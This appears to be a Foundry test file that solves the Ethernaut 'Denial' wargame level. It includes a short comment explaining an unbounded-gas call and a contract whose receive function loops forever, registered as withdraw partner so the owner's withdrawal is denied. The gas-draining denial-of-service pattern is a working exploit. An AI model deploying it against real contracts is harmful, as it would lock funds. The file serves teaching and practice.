// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/20-Denial/DenialFactory.sol";
import "../src/Ethernaut.sol";

/* The main goal of this challenge is to drain all the gas in the first
transfer which is to us. The owner get's screwed because we spend all gas
transfering to this contract effectively creating a DoS attack.
This can only be done for 2 reasons:
1- the order on the contract: us then owner
2- the `call` does not have any amount of gas specified so we can drain it all
TIP: check EIP-150: https://github.com/ethereum/EIPs/blob/master/EIPS/eip-150.md
*/
contract HaltAndCatchFire {
    receive() external payable {
        while (true) {}
    }
}

contract DenialTest is Test {
    Ethernaut ethernaut;
    address playerAddress = address(6529);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(playerAddress, 2 ether);
    }

    function testDenial() public {
        // Level Setup
        DenialFactory denialFactory = new DenialFactory();
        ethernaut.registerLevel(denialFactory);
        vm.startPrank(playerAddress);
        address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(denialFactory);
        Denial ethernautDenial = Denial(payable(levelAddress));

        // Level Attack
        HaltAndCatchFire attack = new HaltAndCatchFire();
        ethernautDenial.setWithdrawPartner(address(attack));

        // Level Submission
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
